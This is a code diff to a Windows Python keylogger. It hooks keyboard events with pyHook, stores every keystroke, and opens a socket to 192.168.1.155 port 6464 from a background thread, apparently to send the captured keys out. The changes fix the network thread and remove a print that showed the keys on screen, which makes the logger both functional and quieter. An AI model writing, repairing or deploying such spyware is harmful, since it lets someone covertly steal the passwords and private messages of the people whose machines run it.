@@ -5,19 +5,12 @@ import pythoncom
 import win32api
 import win32gui
 import pyHook
+import time
 import os
 
 # variable declartion
 global pressed_keys
 pressed_keys = []
-
-# iniatiate sockets
-s = socket(AF_INET, SOCK_STREAM)
-s.connect(("192.168.1.155", 6464))
-
-# start network loop
-socket_thread = threading.Thread(target=socket_connections, args=(s,))
-socket_thread.start()
 
 # network stuff
 def socket_connection(s):
@@ -27,10 +20,17 @@ def socket_connection(s):
 
 	s.close()
 
+# iniatiate sockets
+s = socket(AF_INET, SOCK_STREAM)
+s.connect(("192.168.1.155", 6464))
+
+# start network loop
+socket_thread = threading.Thread(target=socket_connection, args=(s,))
+socket_thread.start()
+
 # key logging stuff
 def OnKeyBoardEvent(event):
 	pressed_keys.append(chr(event.Ascii))
-	print "".join(pressed_keys)
 
 # start listing for key presses ---
 # create a hook manager object
